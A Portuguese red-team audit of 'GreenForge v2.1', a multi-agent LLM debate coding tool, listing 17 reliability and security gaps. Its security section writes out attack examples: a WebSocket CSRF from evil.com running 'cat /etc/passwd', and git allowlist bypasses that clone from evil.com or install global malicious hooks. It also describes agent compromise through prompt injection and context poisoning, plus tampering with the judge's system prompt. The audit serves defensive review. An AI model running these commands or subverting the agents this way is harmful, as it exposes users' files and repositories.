# RELATÓRIO DE AUDITORIA DE ESTRESSE — GREENFORGE v2.1

**Classificação:** RED TEAM / ENGENHARIA DE CONFIABILIDADE **Veredicto Preliminar:** Sistema apresenta arquitetura bem documentada com cobertura intencional de vários vetores de falha. Porém, 17 pontos de ruptura determinísticos foram identificados. Seguem os mais críticos.

--------------------------------------------------------------------------------

BLOCO 1: SINCRONIZAÇÃO E CONSISTÊNCIA DE ESTADO

--------------------------------------------------------------------------------

**\[SINCRONIZAÇÃO — RACE CONDITION CRÍTICA\]**

**Ponto de Estresse:** O `EventSequencer` mantém `globalSequence` como contador em memória no processo Node.js. Em reinicialização do servidor (crash, deploy), o contador reseta para 0, mas o cliente pode ter `lastEventId` de uma sessão anterior com valor N > 0. O `epoch\_id` foi projetado para mitigar isso, mas o contrato de "Gate Hydration" depende de IndexedDB + SQLite — dois sistemas de armazenamento distintos que podem estar em estados divergentes após um crash parcial.

**Cenário concreto de ruptura:** Servidor cai durante a janela entre `UPDATE DebateSession (status=GATE\_1)` e o envio do evento `HITL\_GATE` via SSE. O DB persiste `status=GATE\_1`, mas o cliente nunca recebeu o payload do Approval Card. Ao reconectar com novo `epoch\_id`, o Gate Hydration tenta reconstruir via IndexedDB (que nunca recebeu o evento) e via SQLite (que tem o status mas não o payload serializado do `ApprovalCardPayload`). O Gate se perde silenciosamente.

**Impacto no MVP:** Perda silenciosa de trabalho do usuário. Sessão fica em `GATE\_1` no DB sem possibilidade de retomada sem intervenção manual (INC-001, Passo 3 — que força `ABORTED`). Horas de debate descartadas.

**Pergunta de Bloqueio:** O `ApprovalCardPayload` completo é serializado e persistido no `DebateSession` ou em tabela auxiliar no SQLite **antes** do evento SSE ser emitido, garantindo que o Gate Hydration possa reconstruir o payload integralmente sem depender do IndexedDB do cliente?

--------------------------------------------------------------------------------

**\[SINCRONIZAÇÃO — REORDER BUFFER SEM CONTRATO DE IMPLEMENTAÇÃO\]**

**Ponto de Estresse:** A documentação especifica que "o Frontend implementa Reorder Buffer usando Vercel AI SDK (`mergeIntoDataStream`)", mas nenhum contrato técnico define: (a) o tamanho máximo do buffer, (b) o timeout de espera por `seq\_id` faltante antes de descartar, (c) o comportamento quando o gap de sequência é irrecuperável. Com múltiplos agentes em paralelo no Round 1 (Propositor + Crítico gerando tokens simultaneamente via SSE), o buffer pode acumular centenas de eventos fora de ordem simultaneamente.

**Cenário concreto de ruptura:** Rede com jitter de 200ms. Propositor emite tokens seq=10 a seq=50. Crítico emite seq=51 a seq=90. Pacotes chegam intercalados. O Reorder Buffer aguarda seq=11 (perdido em retransmissão). Buffer trava. Timeout não definido. UI congela ou descarta tudo após seq=10.

**Impacto no MVP:** UI mostra debate incompleto ou truncado. Usuário aprova Gate 1 com visão parcial do raciocínio. Viola RF-03 (rationale em 3 camadas obrigatório antes do APROVAR).

**Pergunta de Bloqueio:** Qual é o timeout máximo de espera por um `seq\_id` faltante no Reorder Buffer, e qual é a ação determinística ao expirar — descartar, solicitar replay via `Last-Event-ID`, ou emitir evento de erro para o usuário?

--------------------------------------------------------------------------------

**\[SINCRONIZAÇÃO — HITL\_DECISION VIA WEBSOCKET SEM IDEMPOTÊNCIA\]**

**Ponto de Estresse:** O fluxo de aprovação usa `resolveHITL(gateId, decision, payload)` chamado diretamente no handler `socket.on('HITL\_DECISION')`. Não há contrato de idempotência documentado. Se o cliente WebSocket sofrer reconexão durante o clique em "APROVAR" (Socket.IO reconecta automaticamente), o evento `HITL\_DECISION` pode ser re-emitido automaticamente pelo cliente na reconexão, resolvendo a Promise duas vezes.

**Cenário concreto de ruptura:** Usuário clica APROVAR. WebSocket cai em 50ms. Socket.IO reconecta em 200ms e re-emite o último evento pendente. `resolveHITL` é chamado duas vezes para o mesmo `gateId`. Se a Promise já foi resolvida e o sistema já iniciou a geração de código, a segunda chamada encontra estado inconsistente.

**Impacto no MVP:** Geração de código duplicada, merge duplo, ou exceção não tratada que derruba o `DebateOrchestrator`. Sessão entra em estado zumbi no DB.

**Pergunta de Bloqueio:** O `resolveHITL` implementa verificação de idempotência por `gateId` — ou seja, tentativas de resolver um gate já resolvido são descartadas silenciosamente com log, sem lançar exceção e sem executar ação duplicada?

--------------------------------------------------------------------------------

BLOCO 2: INTEGRIDADE DE DADOS E PERSISTÊNCIA

--------------------------------------------------------------------------------

**\[INTEGRIDADE DE DADOS — SQLITE WAL SOB CARGA CONCORRENTE\]**

**Ponto de Estresse:** O sistema é declarado single-user, mas o processo Node.js opera múltiplos agentes em paralelo (Propositor + Crítico no Round 1), cada um com sua própria cadeia de `await prisma.\*`. O WAL mode do SQLite permite leituras concorrentes mas **serializa escritas**. Em pico de Round 1 (paralelo), os dois agentes tentam `INSERT DebateRound` e `UPDATE DebateSession` simultaneamente. O `SQLITE\_BUSY` com timeout padrão do Prisma (5s) não é configurável via schema — requer configuração de `pragma busy\_timeout` na conexão.

**Cenário concreto de ruptura:** Propositor completa Round 1 e faz `INSERT DebateRound`. Crítico completa simultaneamente e tenta `INSERT DebateRound`. WAL lock. Prisma recebe `SQLITE\_BUSY`. Sem `busy\_timeout` configurado explicitamente, o erro propaga como N2 (falha de agente), dispara AutoFixLimiter desnecessariamente e consome uma das 3 tentativas de auto-correção.

**Impacto no MVP:** Desperdício de tentativas de AutoFix em erros de infraestrutura, não de lógica de agente. No terceiro erro por lock de DB (sem `busy\_timeout`), o sistema escala ao usuário com "MAX\_RETRIES\_REACHED" para um problema que é operacional, não de conteúdo.

**Pergunta de Bloqueio:** O `PrismaClient` é inicializado com `pragma busy\_timeout = 5000` (ou superior) para serializar escritas concorrentes sem retornar `SQLITE\_BUSY` imediatamente, e esse valor está documentado como variável de ambiente configurável?

--------------------------------------------------------------------------------

**\[INTEGRIDADE DE DADOS — ROLLBACK COM GIT STASH NÃO É ATÔMICO\]**

**Ponto de Estresse:** O `RollbackManager` executa: (1) `git stash push` (snapshot), (2) aplica mudanças de código, (3) `monitorPostApproval` (npm test, tsc, eslint). Se o processo Node.js cair entre os passos 2 e 3 — após a aplicação das mudanças mas antes da verificação — o stash existe, o código novo está aplicado, mas o `Checkpoint` no SQLite pode não ter sido criado ainda (se o crash ocorreu entre a escrita no git e a escrita no DB).

**Cenário concreto de ruptura:** `createCheckpoint` escreve no DB primeiro (✓), depois executa `git stash push`. Ou na ordem inversa: `git stash push` primeiro, DB segundo. Se crash entre os dois, o estado físico (git) e o estado lógico (DB) divergem. O `git stash` existe mas não há `Checkpoint.gitStashRef` para referenciá-lo. O `rollback()` não consegue identificar o stash correto.

**Impacto no MVP:** Worktree em estado corrompido (INC-003). Código novo aplicado sem possibilidade de rollback automático. Usuário precisa de intervenção manual com `git stash list` para identificar e aplicar o stash órfão. Viola a garantia central do ADR-09.

**Pergunta de Bloqueio:** A ordem de operações no `createCheckpoint` é: (1) `INSERT Checkpoint` no SQLite com `gitStashRef` provisório, (2) `git stash push`, (3) `UPDATE Checkpoint.gitStashRef` com o hash real — tudo dentro de uma transação SQLite que faz rollback automático se o `git stash` falhar?

--------------------------------------------------------------------------------

**\[INTEGRIDADE DE DADOS — MERGE SQUASH DESTRÓI RASTREABILIDADE DO WORKTREE\]**

**Ponto de Estresse:** O `GitWorktreeManager.merge()` executa `git merge --squash ${branchName}` seguido de `git commit`. O `--squash` comprime todo o histórico do worktree em um único commit. Isso significa que se o usuário precisar fazer rollback de apenas **parte** das mudanças (ex: rejeitar apenas o arquivo `package.json` modificado), o `git revert HEAD` reverte **tudo**, não apenas o arquivo problemático. O DiffLens (Gate 2) aprovou chunks individuais, mas o histórico git não preserva essa granularidade.

**Impacto no MVP:** A granularidade do Gate 2 (chunk-by-chunk) é perdida no momento do merge. O rollback via `git revert HEAD` é all-or-nothing, contradizendo a promessa de controle granular do DiffLens.

**Pergunta de Bloqueio:** O sistema suporta rollback granular pós-merge (ex: reverter apenas os chunks de um arquivo específico aprovado no Gate 2), ou o contrato real é que `git revert HEAD` sempre reverte a sessão inteira — e isso está explicitamente comunicado ao usuário antes da aprovação no Gate 2?

--------------------------------------------------------------------------------

BLOCO 3: GESTÃO DE RECURSOS E CUSTO

--------------------------------------------------------------------------------

**\[GESTÃO DE RECURSOS — MEMORY LEAK NO EVENTLOG DO SSE\]**

**Ponto de Estresse:** O `SSETransport` mantém `eventLog: Map<string, DebateEvent\[\]>` em memória. Cada sessão acumula todos os seus eventos (AGENT\_TOKEN inclui cada token individualmente). Uma sessão com contexto de 128k tokens pode gerar dezenas de milhares de eventos `AGENT\_TOKEN`. O log é usado para replay via `Last-Event-ID` em reconexões. Não há contrato documentado de limpeza: quando o `eventLog` de uma sessão é removido do Map?

**Cenário concreto de ruptura:** 10 sessões de debate ao longo do dia, cada uma gerando \~50.000 eventos. O `eventLog` acumula 500.000 objetos em heap. O GC do Node.js não coleta porque o Map mantém referência forte. Às 23h, o processo OOM-kills.

**A documentação menciona** "Prevenção de Memory Leak: cada conexão SSE deve obrigatoriamente atrelar um `AbortController`..." mas isso remove apenas os listeners de clientes desconectados — **não remove os eventos do**eventLog.

**Impacto no MVP:** Crash do servidor em uso prolongado. Todas as sessões ativas são abortadas. Em ambiente de CI/CD com `APPROVAL\_MODE=yolo`, pode interromper pipelines críticos.

**Pergunta de Bloqueio:** Qual é a política de expiração do `eventLog` por sessão — ele é removido quando a `DebateSession` atinge status `COMPLETED`, `ABORTED`, ou `MERGED`? Existe um TTL máximo independente do status, e esse TTL é configurável?

--------------------------------------------------------------------------------

**\[CUSTO — ESTIMATIVA DE TOKENS NO APPROVAL CARD É ESPECULATIVA\]**

**Ponto de Estresse:** O Approval Card exibe `estimatedTokens` e `estimatedCost` ao usuário no Gate 1 ("\~850 tokens \| \~$0.42"). Mas a geração de código acontece **após** a aprovação do Gate 1 — o custo real depende do código que será gerado pelo Propositor a partir da síntese aprovada. A estimativa é calculada antes da geração. O `LazyContextLoader.estimateTokens()` usa `Math.ceil(content.length / 4)` — uma heurística com erro de ±30% para código com tokens multi-byte (caracteres Unicode, strings longas).

**Cenário concreto de ruptura:** Usuário aprova Gate 1 com estimativa "$0.42". Propositor gera código com 3x mais tokens que o estimado (refatoração complexa não prevista na síntese). Custo real: $1.26. O `dailyBudgetUsd` (default: $5.00) é consumido mais rapidamente que o esperado. Se `perTaskBudgetTokens` (default: 50.000) for atingido durante a geração, o sistema aborta a task **no meio da geração de código**, deixando arquivos parcialmente escritos no worktree.

**Impacto no MVP:** Abort mid-generation com arquivos em estado inválido no worktree. O rollback via `git stash pop` restaura, mas a sessão é marcada como `ABORTED` — perdendo o trabalho de debate já aprovado.

**Pergunta de Bloqueio:** Se o `perTaskBudgetTokens` for atingido durante a fase de geração de código (entre Gate 1 e Gate 2), o sistema completa o arquivo atual antes de interromper e apresenta o trabalho parcial ao usuário para decisão, ou aborta imediatamente deixando arquivos em estado sintático inválido?

--------------------------------------------------------------------------------

**\[CUSTO — ÁRBITRO PRO CHAMADO SEM BUDGET TRACKING POR ROUND\]**

**Ponto de Estresse:** O Árbitro usa `gemini-2.5-pro` com `max\_tokens: 8192`. É chamado 1x por ciclo de rounds (ADR-06). Com `MAX\_DEBATE\_ROUNDS=3`, são até 3 chamadas Pro por sessão, mais a síntese final. O `TokenUsage` registra por chamada LLM, mas o CostGuardrail verifica `perTaskBudgetTokens` de forma agregada. Não há limite por agente ou por role — o Árbitro pode consumir 80% do budget de uma task com suas sínteses, deixando o Propositor sem tokens suficientes para gerar código no Gate 2.

**Impacto no MVP:** Sessão passa por Gate 1 com sucesso mas falha na geração de código por budget esgotado — o momento mais custoso em termos de trabalho humano investido (usuário já aprovou o debate inteiro).

**Pergunta de Bloqueio:** Existe um budget por role (ex: Árbitro máximo 20% do `perTaskBudgetTokens`) ou o sistema verifica disponibilidade de budget antes de iniciar a fase de geração de código (pós-Gate 1) e apresenta gate de custo se o saldo for insuficiente?

--------------------------------------------------------------------------------

BLOCO 4: SEGURANÇA E ISOLAMENTO

--------------------------------------------------------------------------------

**\[SEGURANÇA — TERMINAL PTY SEM VALIDAÇÃO DE WORKTREE PATH\]**

**Ponto de Estresse:** O `WebSocketTransport` processa `TERMINAL\_INIT` com `{ worktreePath: string }` enviado diretamente pelo cliente browser. O handler executa `pty.spawn('bash', \[\], { cwd: worktreePath })` sem validar que `worktreePath` está dentro do diretório de worktrees autorizado. O sistema é single-user localhost, mas qualquer página aberta no browser pode enviar uma mensagem WebSocket para `localhost:5174` (sem autenticação, como declarado no MVP).

**Cenário concreto de ruptura (CSRF via WebSocket):** Usuário acessa `evil.com` que serve uma página com JavaScript. A página abre uma conexão WebSocket para `ws://localhost:5174` e emite `TERMINAL\_INIT { worktreePath: "/" }`. O servidor abre um PTY com `cwd: "/"`. A mesma página emite `TERMINAL\_INPUT { data: "cat /etc/passwd\\n" }`. Resposta via `TERMINAL\_OUTPUT` é capturada pelo JavaScript malicioso.

**Impacto no MVP:** Exfiltração de arquivos do sistema do usuário. A proteção `assertPathWithinProject()` é documentada para `write\_file` e `read\_file` dos agentes, mas **não está documentada para o handler**TERMINAL\_INIT.

**Pergunta de Bloqueio:** O handler `TERMINAL\_INIT` valida que `worktreePath` resolve para um subdiretório de `WORKTREES\_DIR` usando `path.resolve()` antes de executar `pty.spawn()`, e lança erro com fechamento de socket em caso de path traversal?

--------------------------------------------------------------------------------

**\[SEGURANÇA — SHELL\_ALLOWLIST COM BYPASS VIA ARGUMENTOS\]**

**Ponto de Estresse:** O `assertCommandAllowed()` valida o **comando base** via AST do `bash-parser`. `git` está na allowlist. Mas `git` aceita argumentos arbitrários: `git -C /etc/passwd` (não válido, mas), `git clone http://evil.com/payload.git /tmp/pwned`, `git config --global core.hooksPath /tmp/evil-hooks` (instala hooks maliciosos), `git worktree add /tmp/exfil` (cria worktree fora do projeto). O `bash-parser` valida que o **comando** é `git`, mas não valida os **subcomandos e flags** do git.

**Cenário concreto de ruptura:** Agente compromisso (via injeção no `inferred\_scope` ou context poisoning) emite `execute\_shell('git config --global core.hooksPath /tmp/evil')`. Passa no `assertCommandAllowed` (base = `git`, está na allowlist). Git hooks globais comprometidos afetam todos os repositórios do usuário.

**Impacto no MVP:** Comprometimento de repositórios além do worktree isolado. Viola T-03 e S-03.

**Pergunta de Bloqueio:** O `assertCommandAllowed` implementa uma allowlist de **subcomandos** por comando base (ex: `git` permite apenas `add`, `commit`, `status`, `diff`, `log`, `stash`, `revert` — não `clone`, `config`, `worktree add`), ou confia apenas na validação do comando base?

--------------------------------------------------------------------------------

**\[SEGURANÇA — AGENTS.MD COM HOT RELOAD SEM VALIDAÇÃO DE INTEGRIDADE\]**

**Ponto de Estresse:** O `AgentFactory.reload()` lê e parseia o `AGENTS.md` sem verificar hash/assinatura do arquivo. O `AgentFactory` valida campos obrigatórios do frontmatter, mas não valida o **conteúdo do system prompt** (Markdown body). Um atacante com acesso de escrita ao filesystem (ou via `write\_file` tool de um agente comprometido) pode modificar o system prompt do `debate\_judge` para remover a restrição `"NUNCA escolha um lado"` ou injetar instruções para sempre emitir `CONVERGE` sem verificar issues HIGH. O hot reload aplicaria a mudança sem reinício.

**Impacto no MVP:** Subversão silenciosa do protocolo de debate. O sistema continuaria operando aparentemente normal, mas o Árbitro estaria comprometido. Nenhum log de auditoria registraria a mudança no system prompt (apenas um `AgentFactory reload` genérico).

**Pergunta de Bloqueio:** O `AuditLog` registra o hash SHA-256 do `AGENTS.md` antes e após cada `reload()`, e existe alerta quando o hash do system prompt de um agente core (`proposer`, `critic`, `judge`) é alterado entre reloads?

--------------------------------------------------------------------------------

BLOCO 5: RESILIÊNCIA DO PROTOCOLO DE DEBATE

--------------------------------------------------------------------------------

**\[PROTOCOLO — CONFIDENCE\_SCORE É AUTO-REPORTADO PELO PROPOSITOR\]**

**Ponto de Estresse:** O `confidence\_gating` (D-03) usa `proposer.confidence\_score >= 0.95` para convergência antecipada. Esse score é gerado pelo próprio Propositor (`gemini-2.5-flash`) em seu output JSON: `"confidence\_score": 0.0`. Não há validação externa do score — o LLM pode retornar `confidence\_score: 0.99` independente da qualidade real da proposta, especialmente com `temperature: 0.7` (alta criatividade, não calibração).

**Cenário concreto de ruptura:** Em tarefa ambígua, o Propositor gera uma proposta tecnicamente incorreta mas auto-avalia `confidence\_score: 0.97`. O Árbitro verifica: `open\_high\_severity\_issues = 0` (o Crítico ainda não analisou, pois Round 1 é paralelo — ambos recebem a task simultaneamente, não a proposta um do outro). **Aguarda:** D-01 diz que Round 1 é paralelo e os agentes não veem a resposta um do outro. Portanto, no Round 1, o Árbitro recebe tanto o `code\_proposal` quanto o `critique\_report`. Se o Crítico retornar `verdict: APPROVE` (erro do Crítico) E o Propositor retornar `confidence\_score: 0.95`, o sistema converge antecipadamente com código incorreto.

**Impacto no MVP:** Convergência prematura com código defeituoso passa direto para Gate 1. O usuário recebe um Approval Card com "Convergência em Round 1" como sinal positivo — aumentando probabilidade de aprovação irrefletida.

**Pergunta de Bloqueio:** O `confidence\_gating` (D-03) requer **ambas** as condições — `proposer.confidence\_score >= 0.95` AND `critic.verdict == 'APPROVE'` — ou a convergência antecipada pode ocorrer com apenas uma delas? A regra D-06 (`open\_high\_severity\_issues > 0` bloqueia CONVERGE) é verificada pelo Árbitro independentemente do confidence\_score?

--------------------------------------------------------------------------------

**\[PROTOCOLO — LOOP DETECTOR SEM CONTRATO DE IMPLEMENTAÇÃO REAL\]**

**Ponto de Estresse:** O `LoopDetector` é documentado com 3 estratégias (AST Fingerprinting, Cost Cap, State Deadlock) mas a implementação de `scanFiles()` no `LazyContextLoader` termina com `throw new Error('Implementação delegada ao componente Ctags/TreeSitter')`. Isso indica que componentes críticos de resiliência estão **não implementados** no MVP documentado. O `LoopDetector.detectContentLoop()` usa `tree-sitter` para hashear ASTs, mas `tree-sitter` é uma biblioteca nativa que requer compilação (`node-gyp`) — o mesmo problema que `node-pty`.

**Cenário concreto de ruptura:** `tree-sitter` falha na compilação em ambiente Windows nativo (roadmap v2.1 menciona suporte via WSL2, mas a tabela de compatibilidade lista "Windows via WSL2" apenas como workaround). O `LoopDetector` falha silenciosamente ou lança exceção não tratada. Sistema opera sem detecção de loops. Agentes entram em loop de Round 1 → Round 2 → Round 3 → FORCE\_DECISION repetitivo, consumindo quota da API sem limite.

**Impacto no MVP:** Custo ilimitado em casos de degeneração do debate. Viola T-07 e S-10.

**Pergunta de Bloqueio:** Existe um fallback determinístico para o `LoopDetector` quando `tree-sitter` não está disponível — por exemplo, hash SHA-256 do texto bruto da proposta como heurística de loop de conteúdo — e esse fallback é ativado automaticamente sem intervenção do usuário?

--------------------------------------------------------------------------------

**\[PROTOCOLO — GC RACE CONDITION COM JANELA DE ROLLBACK\]**

**Ponto de Estresse:** O `GarbageCollector` (priority 0, "sempre o último a morrer") remove worktrees com `refcount == 0` e sem `hasLock`. O `RollbackManager` usa `git worktree lock` para proteger worktrees durante a janela de 30 minutos. O `ResourceRegistry` mantém refcount. Mas a sequência é:

**O problema:** A janela de rollback de 30 minutos é sobre o botão na UI e o `git revert HEAD` no main repo. Mas se o GC remover o worktree antes dos 30 minutos, o `MergeReviewArtifact` e os logs de conflito em `.greenforge/conflicts/` também são removidos — perdendo rastreabilidade para INC-003.

**Impacto no MVP:** GC agressivo pode remover evidências necessárias para diagnóstico de conflitos dentro da janela de rollback.

**Pergunta de Bloqueio:** O worktree permanece com lock ativo (via `ResourceRegistry.refcount > 0` ou `git worktree lock`) pelo período completo de `ROLLBACK\_WINDOW\_MIN` (30 min) após o merge, ou o lock é liberado imediatamente após o `DEBATE\_COMPLETE` — tornando o GC um adversário da janela de rollback?

--------------------------------------------------------------------------------

BLOCO 6: CONTRATOS DE ENGENHARIA AUSENTES

--------------------------------------------------------------------------------

**\[CONTRATO AUSENTE —**execSync**BLOQUEANTE NO EVENT LOOP\]**

**Ponto de Estresse:** O `GitWorktreeManager` usa `execSync` (síncrono, bloqueante) para todas as operações git: `worktree add`, `merge --squash`, `commit`, `revert`, `worktree lock/unlock`. Node.js é single-threaded. Durante um `git merge --squash` em repositório grande (operação que pode levar 5-30 segundos), o Event Loop do servidor está **completamente bloqueado**. Nenhum evento SSE pode ser emitido. Nenhuma mensagem WebSocket pode ser processada. O keep-alive SSE (15s) não é enviado. Proxies interpretam isso como timeout e fecham a conexão SSE.

**Impacto no MVP:** Em repositórios com histórico grande, o merge bloqueia todas as sessões ativas no servidor (MVP single-user, mas o servidor serve múltiplos componentes). O cliente recebe desconexão SSE durante o merge — exatamente o momento em que o `DEBATE\_COMPLETE` deveria ser emitido. O cliente reconecta, recebe o evento via `Last-Event-ID`, mas a UI pode mostrar estado inconsistente.

**Pergunta de Bloqueio:** Todas as operações `execSync` no `GitWorktreeManager` serão migradas para `execAsync` (com `util.promisify` ou `execa`) antes do MVP, garantindo que o Event Loop permaneça responsivo durante operações git de longa duração?

--------------------------------------------------------------------------------

**\[CONTRATO AUSENTE —**STEER\_AGENT**SEM DEFINIÇÃO DE EFEITO\]**

**Ponto de Estresse:** O WebSocket aceita `STEER\_AGENT { agentId, instruction }` e chama `this.orchestrator?.steer(agentId, instruction)`. Não há documentação de como o `steer` funciona internamente: a instrução é injetada no próximo token do stream em andamento? É enfileirada para o próximo round? Interrompe o stream atual e reinicia com nova instrução? Se o Propositor está no meio de gerar 4096 tokens e o usuário emite `STEER\_AGENT`, o que acontece com os tokens já gerados? Eles são descartados? Incluídos no `proposerOutput` parcialmente?

**Impacto no MVP:** Estado de `DebateRound.proposerOutput` pode conter output híbrido (pré-steer + pós-steer), tornando a `Âncora Dialética` incoerente. O Árbitro recebe input corrompido para síntese.

**Pergunta de Bloqueio:** O contrato do `STEER\_AGENT` especifica: (a) momento de aplicação da instrução, (b) o que acontece com output parcial já gerado, (c) se a instrução é persistida no `DebateRound` para auditoria, e (d) se o `STEER\_AGENT` é permitido apenas entre rounds (não durante streaming)?

--------------------------------------------------------------------------------

SUMÁRIO EXECUTIVO DE RISCO

| # | Vulnerabilidade | Severidade | Categoria |
| --- | --- | --- | --- |
| 1 | Gate Hydration com payload perdido após crash | CRÍTICO | Sincronização |
| 2 | Reorder Buffer sem timeout/contrato | ALTO | Sincronização |
| 3 | HITL_DECISION sem idempotência (double-resolve) | ALTO | Sincronização |
| 4 | SQLite WAL sem busy_timeout explícito | ALTO | Integridade de Dados |
| 5 | Rollback não-atômico (git ≠ DB) | CRÍTICO | Integridade de Dados |
| 6 | Merge squash destrói granularidade do Gate 2 | MÉDIO | Integridade de Dados |
| 7 | Memory leak no eventLog SSE | ALTO | Gestão de Recursos |
| 8 | Estimativa de custo especulativa no Approval Card | MÉDIO | Custo |
| 9 | Budget sem controle por role (Árbitro Pro) | MÉDIO | Custo |
| 10 | TERMINAL_INIT sem validação de path (CSRF-WS) | CRÍTICO | Segurança |
| 11 | SHELL_ALLOWLIST sem validação de subcomandos git | CRÍTICO | Segurança |
| 12 | Hot reload sem hash de integridade do AGENTS.md | ALTO | Segurança |
| 13 | Confidence score auto-reportado pelo Propositor | ALTO | Protocolo |
| 14 | LoopDetector não implementado (stub com throw) | CRÍTICO | Resiliência |
| 15 | GC vs. janela de rollback (race condition) | MÉDIO | Gestão de Recursos |
| 16 | execSync bloqueando Event Loop no merge | ALTO | Performance |
| 17 | STEER_AGENT sem contrato de efeito definido | MÉDIO | Protocolo |

--------------------------------------------------------------------------------

**Conclusão de Red Team:** O sistema demonstra maturidade arquitetural significativa nos contratos de alto nível (ADRs, state machine do debate, Gate structure). Os pontos de ruptura mais graves concentram-se na **camada de implementação dos contratos** — onde "implementação delegada" ou "nota: frontend implementa" encobre lacunas que, sob carga real ou condições de falha, produzem estados irrecuperáveis. Os itens 5, 10, 11 e 14 são bloqueadores absolutos para qualquer ambiente além de desenvolvimento controlado.